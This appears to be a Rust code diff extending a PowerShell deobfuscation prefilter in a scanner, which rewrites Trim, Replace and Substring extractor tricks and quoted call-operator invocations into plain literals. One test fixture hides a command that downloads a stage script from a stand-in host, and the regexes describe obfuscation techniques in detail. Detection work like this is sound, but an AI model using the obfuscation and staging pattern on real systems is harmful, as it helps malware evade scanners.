@@ -3614,6 +3614,11 @@ fn expand_space_concat(text: &str) -> String {
     let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE
         .find_iter(text)
         .filter_map(|m| {
+            if previous_non_whitespace_ascii_byte(text, m.start()) == Some(b'&')
+                || follows_quoted_call_operator_command(text, m.start())
+            {
+                return None;
+            }
             let s = m.as_str();
             // Extract all single-quoted parts
             let parts: Vec<String> = SPACE_PART_RE
@@ -3634,6 +3639,43 @@ fn expand_space_concat(text: &str) -> String {
     out
 }
 
+fn follows_quoted_call_operator_command(text: &str, pos: usize) -> bool {
+    let bytes = text.as_bytes();
+    let mut cursor = pos;
+    while cursor > 0 && bytes[cursor - 1].is_ascii_whitespace() {
+        cursor -= 1;
+    }
+    if cursor == 0 {
+        return false;
+    }
+
+    let token_start = if bytes[cursor - 1] == b'\'' {
+        let close_quote = cursor - 1;
+        let Some(open_quote) = text[..close_quote].rfind('\'') else {
+            return false;
+        };
+        open_quote
+    } else {
+        let mut start = cursor;
+        while start > 0
+            && (bytes[start - 1].is_ascii_alphanumeric()
+                || matches!(bytes[start - 1], b'_' | b'-' | b':' | b'$'))
+        {
+            start -= 1;
+        }
+        if start == cursor {
+            return false;
+        }
+        start
+    };
+
+    let mut before_token = token_start;
+    while before_token > 0 && bytes[before_token - 1].is_ascii_whitespace() {
+        before_token -= 1;
+    }
+    before_token > 0 && bytes[before_token - 1] == b'&'
+}
+
 #[cfg(test)]
 mod space_concat_prefilter_tests {
     use super::expand_space_concat;
@@ -3641,6 +3683,12 @@ mod space_concat_prefilter_tests {
     #[test]
     fn ignores_text_without_space_concat_shape() {
         let text = "Write-Host 'hello world'";
+        assert_eq!(expand_space_concat(text), text);
+    }
+
+    #[test]
+    fn does_not_merge_quoted_call_operator_arguments() {
+        let text = "& 'Clean' 'payload' '~'";
         assert_eq!(expand_space_concat(text), text);
     }
 }
@@ -3889,6 +3937,28 @@ mod char_array_chunk_prefilter_tests {
     }
 }
 
+#[cfg(test)]
+mod literal_trim_extractor_tests {
+    use super::expand_literal_trim_extractor_calls;
+
+    #[test]
+    fn rewrites_quoted_call_operator_trim_extractor_call() {
+        let text = r#"function Clean($value,$chars) {
+  return $value.Trim($chars)
+}
+& 'Clean' '~~~Invoke-WebRequest -Uri https://ps-quoted-call-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-quoted-call-extractor.example/stage.ps1'"
+            ),
+            "quoted call-operator trim extractor call was not rewritten:\n{out}"
+        );
+    }
+}
+
 // ---- Skip-Nth-Char decoder (Invoke-Obfuscation pattern) ----
 
 #[allow(clippy::expect_used)]
@@ -3968,6 +4038,14 @@ static LITERAL_REPLACE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static LITERAL_DOT_REPLACE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
+    )
+    .expect("literal dot-replace extractor def")
+});
+
+#[allow(clippy::expect_used)]
 static LITERAL_SUBSTRING_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?(?:return\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
@@ -3986,15 +4064,23 @@ static LITERAL_CONST_SUBSTRING_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static LITERAL_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Trim\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
+        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
     )
     .expect("literal trim extractor def")
 });
 
 #[allow(clippy::expect_used)]
+static LITERAL_PARAM_BLOCK_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\{\s*param\s*\(([^)]*)\)[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
+    )
+    .expect("literal param-block trim extractor def")
+});
+
+#[allow(clippy::expect_used)]
 static LITERAL_CONST_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Trim\s*\(\s*'((?:''|[^'])*)'\s*\)[^{}]*\}"#,
+        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*'((?:''|[^'])*)'\s*\)[^{}]*\}"#,
     )
     .expect("literal constant trim extractor def")
 });
@@ -4134,6 +4220,97 @@ struct PsLiteralArgBinding {
     position: usize,
 }
 
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum PsTrimMode {
+    Both,
+    Start,
+    End,
+}
+
+impl PsTrimMode {
+    fn from_suffix(suffix: Option<&str>) -> Self {
+        match suffix.unwrap_or_default().to_ascii_lowercase().as_str() {
+            "start" => Self::Start,
+            "end" => Self::End,
+            _ => Self::Both,
+        }
+    }
+
+    fn apply(self, value: &str, chars: &str) -> String {
+        match self {
+            Self::Both => value.trim_matches(|ch| chars.contains(ch)).to_string(),
+            Self::Start => value
+                .trim_start_matches(|ch| chars.contains(ch))
+                .to_string(),
+            Self::End => value.trim_end_matches(|ch| chars.contains(ch)).to_string(),
+        }
+    }
+}
+
+fn ps_literal_string_assignments_to(text: &str, value: &str) -> Vec<String> {
+    PS_VAR_ASSIGN_RE
+        .captures_iter(text)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str();
+            let assigned = caps
+                .get(2)
+                .map(|m| m.as_str().replace("''", "'"))
+                .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
+            assigned
+                .eq_ignore_ascii_case(value)
+                .then(|| name.to_ascii_lowercase())
+        })
+        .collect()
+}
+
+fn find_ps_literal_extractor_invocation(
+    text: &str,
+    name: &str,
+    aliases: &[String],
+    search_from: usize,
+) -> Option<(usize, usize, usize)> {
+    let bytes = text.as_bytes();
+    let mut next_from = search_from;
+    while let Some(start) = find_ascii_case_insensitive_from(text, name, next_from) {
+        let end_name = start + name.len();
+        next_from = end_name;
+
+        let quoted_call = text
+            .get(start.saturating_sub(3)..start)
+            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("& '"))
+            && bytes.get(end_name) == Some(&b'\'');
+        if quoted_call {
+            return Some((start - 3, end_name + 1, skip_ascii_ws(bytes, end_name + 1)));
+        }
+
+        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
+            || is_ident_byte(bytes.get(end_name).copied())
+        {
+            continue;
+        }
+
+        let pos = skip_ascii_ws(bytes, end_name);
+        if text
+            .get(start.saturating_sub(2)..start)
+            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("& "))
+        {
+            return Some((start - 2, end_name, pos));
+        }
+        return Some((start, end_name, pos));
+    }
+
+    for alias in aliases {
+        let needle = format!("& ${alias}");
+        let Some(call_start) = find_ascii_case_insensitive_from(text, &needle, search_from) else {
+            continue;
+        };
+        let end_name = call_start + needle.len();
+        return Some((call_start, end_name, skip_ascii_ws(bytes, end_name)));
+    }
+
+    None
+}
+
 fn parse_ps_literal_call_args(
     text: &str,
     mut pos: usize,
@@ -4259,20 +4436,13 @@ fn inline_ps_literal_replace_extractor_calls(
     needle_binding: &PsLiteralArgBinding,
     replacement_binding: &PsLiteralArgBinding,
 ) -> String {
-    let bytes = text.as_bytes();
     let mut matches = Vec::new();
     let mut search_from = 0;
+    let aliases = ps_literal_string_assignments_to(text, name);
 
-    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
-        let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
-            search_from = end_name;
-            continue;
-        }
-
-        let pos = skip_ascii_ws(bytes, end_name);
+    while let Some((start, end_name, pos)) =
+        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
+    {
         let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
             search_from = end_name;
             continue;
@@ -4325,20 +4495,13 @@ fn inline_ps_literal_const_replace_extractor_calls(
     needle: &str,
     replacement_arg: &str,
 ) -> String {
-    let bytes = text.as_bytes();
     let mut matches = Vec::new();
     let mut search_from = 0;
+    let aliases = ps_literal_string_assignments_to(text, name);
 
-    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
-        let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
-            search_from = end_name;
-            continue;
-        }
-
-        let pos = skip_ascii_ws(bytes, end_name);
+    while let Some((start, end_name, pos)) =
+        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
+    {
         let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
             search_from = end_name;
             continue;
@@ -4373,20 +4536,13 @@ fn inline_ps_literal_substring_extractor_calls(
     start_binding: &PsLiteralArgBinding,
     count_binding: &PsLiteralArgBinding,
 ) -> String {
-    let bytes = text.as_bytes();
     let mut matches = Vec::new();
     let mut search_from = 0;
+    let aliases = ps_literal_string_assignments_to(text, name);
 
-    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
-        let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
-            search_from = end_name;
-            continue;
-        }
-
-        let pos = skip_ascii_ws(bytes, end_name);
+    while let Some((start, end_name, pos)) =
+        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
+    {
         let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
             search_from = end_name;
             continue;
@@ -4441,20 +4597,13 @@ fn inline_ps_literal_const_substring_extractor_calls(
     start_index: usize,
     count: usize,
 ) -> String {
-    let bytes = text.as_bytes();
     let mut matches = Vec::new();
     let mut search_from = 0;
+    let aliases = ps_literal_string_assignments_to(text, name);
 
-    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
-        let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
-            search_from = end_name;
-            continue;
-        }
-
-        let pos = skip_ascii_ws(bytes, end_name);
+    while let Some((start, end_name, pos)) =
+        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
+    {
         let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
             search_from = end_name;
             continue;
@@ -4493,21 +4642,15 @@ fn inline_ps_literal_trim_extractor_calls(
     name: &str,
     value_binding: &PsLiteralArgBinding,
     chars_binding: &PsLiteralArgBinding,
+    mode: PsTrimMode,
 ) -> String {
-    let bytes = text.as_bytes();
     let mut matches = Vec::new();
     let mut search_from = 0;
+    let aliases = ps_literal_string_assignments_to(text, name);
 
-    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
-        let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
-            search_from = end_name;
-            continue;
-        }
-
-        let pos = skip_ascii_ws(bytes, end_name);
+    while let Some((start, end_name, pos)) =
+        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
+    {
         let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
             search_from = end_name;
             continue;
@@ -4526,9 +4669,7 @@ fn inline_ps_literal_trim_extractor_calls(
             search_from = call_end;
             continue;
         };
-        let replacement = value
-            .trim_matches(|ch| chars.contains(ch))
-            .replace('\'', "''");
+        let replacement = mode.apply(value, chars).replace('\'', "''");
         matches.push((start, call_end, format!("'{replacement}'")));
         search_from = call_end;
     }
@@ -4545,21 +4686,15 @@ fn inline_ps_literal_const_trim_extractor_calls(
     name: &str,
     value_binding: &PsLiteralArgBinding,
     chars: &str,
+    mode: PsTrimMode,
 ) -> String {
-    let bytes = text.as_bytes();
     let mut matches = Vec::new();
     let mut search_from = 0;
+    let aliases = ps_literal_string_assignments_to(text, name);
 
-    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
-        let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
-            search_from = end_name;
-            continue;
-        }
-
-        let pos = skip_ascii_ws(bytes, end_name);
+    while let Some((start, end_name, pos)) =
+        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
+    {
         let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
             search_from = end_name;
             continue;
@@ -4571,9 +4706,7 @@ fn inline_ps_literal_const_trim_extractor_calls(
             search_from = call_end;
             continue;
         };
-        let replacement = value
-            .trim_matches(|ch| chars.contains(ch))
-            .replace('\'', "''");
+        let replacement = mode.apply(value, chars).replace('\'', "''");
         matches.push((start, call_end, format!("'{replacement}'")));
         search_from = call_end;
     }
@@ -4858,6 +4991,7 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
         PsLiteralArgBinding,
     )> = LITERAL_REPLACE_EXTRACTOR_DEF_RE
         .captures_iter(text)
+        .chain(LITERAL_DOT_REPLACE_EXTRACTOR_DEF_RE.captures_iter(text))
         .filter_map(|caps| {
             let name = caps.get(1)?.as_str();
             let params = parse_ps_parameter_names(caps.get(2)?.as_str());
@@ -4976,20 +5110,22 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
     {
         return text.to_string();
     }
-    let defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding)> =
+    let defs: Vec<(String, PsLiteralArgBinding, PsLiteralArgBinding, PsTrimMode)> =
         LITERAL_TRIM_EXTRACTOR_DEF_RE
             .captures_iter(text)
+            .chain(LITERAL_PARAM_BLOCK_TRIM_EXTRACTOR_DEF_RE.captures_iter(text))
             .filter_map(|caps| {
                 let name = caps.get(1)?.as_str();
                 let params = parse_ps_parameter_names(caps.get(2)?.as_str());
                 Some((
                     name.to_string(),
                     ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    ps_literal_arg_binding(&params, caps.get(4)?.as_str())?,
+                    ps_literal_arg_binding(&params, caps.get(5)?.as_str())?,
+                    PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
                 ))
             })
             .collect();
-    let const_defs: Vec<(String, PsLiteralArgBinding, String)> =
+    let const_defs: Vec<(String, PsLiteralArgBinding, String, PsTrimMode)> =
         LITERAL_CONST_TRIM_EXTRACTOR_DEF_RE
             .captures_iter(text)
             .filter_map(|caps| {
@@ -4998,16 +5134,24 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
                 Some((
                     name.to_string(),
                     ps_literal_arg_binding(&params, caps.get(3)?.as_str())?,
-                    caps.get(4)?.as_str().replace("''", "'"),
+                    caps.get(5)?.as_str().replace("''", "'"),
+                    PsTrimMode::from_suffix(caps.get(4).map(|m| m.as_str())),
                 ))
             })
             .collect();
     let mut out = text.to_string();
-    for (name, value_binding, chars_binding) in defs {
-        out = inline_ps_literal_trim_extractor_calls(&out, &name, &value_binding, &chars_binding);
+    for (name, value_binding, chars_binding, mode) in defs {
+        out = inline_ps_literal_trim_extractor_calls(
+            &out,
+            &name,
+            &value_binding,
+            &chars_binding,
+            mode,
+        );
     }
-    for (name, value_binding, chars) in const_defs {
-        out = inline_ps_literal_const_trim_extractor_calls(&out, &name, &value_binding, &chars);
+    for (name, value_binding, chars, mode) in const_defs {
+        out =
+            inline_ps_literal_const_trim_extractor_calls(&out, &name, &value_binding, &chars, mode);
     }
     out
 }
